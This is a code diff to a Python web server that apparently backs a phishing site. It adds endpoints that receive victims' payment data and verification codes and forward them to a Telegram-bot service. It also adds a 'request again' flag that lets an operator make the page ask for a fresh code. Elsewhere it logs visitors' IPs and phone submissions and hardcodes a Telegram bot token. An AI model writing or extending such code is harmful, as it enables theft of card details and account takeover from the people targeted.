@@ -6,6 +6,8 @@ import sys
 from urllib.parse import urlparse, unquote
 import requests
 import sqlite3
+import traceback
+import json
 
 # Настройки сервера
 PORT = 80  # Стандартный HTTP порт
@@ -63,6 +65,9 @@ COUNTRY_NAMES = {
     'NZ': 'New Zealand',
     # ... додайте інші країни за потреби ...
 }
+
+# --- In-memory storage for request_again flags ---
+REQUEST_AGAIN_FLAGS = {}
 
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     BOT_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"  # токен з main.py
@@ -207,7 +212,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         if path == '/log_visit':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length).decode('utf-8')
-            import json
             try:
                 data = json.loads(post_data)
                 page = data.get('page', '')
@@ -224,7 +228,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         elif path == '/submit_form':
             content_length = int(self.headers.get('Content-Length', 0))
             post_data = self.rfile.read(content_length).decode('utf-8')
-            import json
             try:
                 data = json.loads(post_data)
                 phone = data.get('phone', '')
@@ -248,6 +251,76 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(400)
                 self.end_headers()
                 self.wfile.write(f'Error: {e}'.encode('utf-8'))
+        elif self.path == '/send_payment_data':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                print("[send_payment_data] Отримано дані:", data)
+                resp = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=3)
+                print(f"[send_payment_data] Відповідь від main.py: {resp.status_code} {resp.text}")
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'ok')
+            except Exception as e:
+                print("[send_payment_data] ERROR:", e)
+                traceback.print_exc()
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
+            return
+        elif path == '/send_code':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                print("[send_code] Отримано код:", data)
+                resp = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=3)
+                print(f"[send_code] Відповідь від main.py: {resp.status_code} {resp.text}")
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'ok')
+            except Exception as e:
+                print("[send_code] ERROR:", e)
+                traceback.print_exc()
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
+            return
+        elif path == '/set_request_again':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                code = data.get('code')
+                if code:
+                    REQUEST_AGAIN_FLAGS[code] = True
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(b'ok')
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b'no code')
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
+            return
+        elif path.startswith('/check_request_again'):
+            from urllib.parse import parse_qs
+            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
+            code = qs.get('code', [None])[0]
+            if code and REQUEST_AGAIN_FLAGS.get(code):
+                REQUEST_AGAIN_FLAGS[code] = False
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'true')
+            else:
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'false')
+            return
         else:
             self.send_response(404)
             self.end_headers()
